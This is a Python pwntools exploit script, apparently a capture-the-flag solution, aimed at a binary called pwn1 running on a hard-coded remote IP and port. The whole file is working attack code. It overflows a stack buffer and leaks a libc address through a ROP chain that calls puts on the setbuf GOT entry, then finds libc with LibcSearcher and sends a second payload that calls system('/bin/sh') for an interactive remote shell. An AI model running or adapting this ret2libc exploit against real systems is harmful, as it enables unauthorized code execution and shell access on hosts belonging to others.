from pwn import *
from LibcSearcher import *
context(arch="amd64",os="linux",log_level="debug")
GDB=args["GDB"]
context.terminal=["tmux","splitw","-h"]
pop_rdi=0x0000000000400823

ret=0x0000000000400576
main_addr=0x00000000004006c7
p=remote("152.136.44.97",20003)
#p=process("./pwn1")
if GDB=="1":
    gdb.attach(p,"b *0x4007b5")
elf=ELF("./pwn1")
printf_plt=elf.plt["printf"]
xx_name="setbuf"
xx_got=elf.got[xx_name]
puts_plt=elf.plt["puts"]
payload="A"*(0x110-16)+p64(1415926)+p32(666)+p32(233)+"b"*8+p64(pop_rdi)+p64(xx_got)+p64(puts_plt)+p64(main_addr)
p.sendafter("name:",payload)
xx=p.recvuntil("name:").split("\n")
print(xx)
xx=u64(xx[2].ljust(8,"\x00"))

print(hex(xx))

libc=LibcSearcher(xx_name,xx)
base=xx-libc.dump(xx_name)
systerm_addr=base+libc.dump("system")
bin_sh_addr=base+libc.dump("str_bin_sh")
print(hex(systerm_addr),hex(bin_sh_addr))
payload="A"*(0x110-16)+p64(1415926)+p32(666)+p32(233)+"b"*8+p64(pop_rdi)+p64(bin_sh_addr)+p64(systerm_addr)
p.sendline(payload)
p.recv()
if GDB=="1":
    pause()
p.interactive()
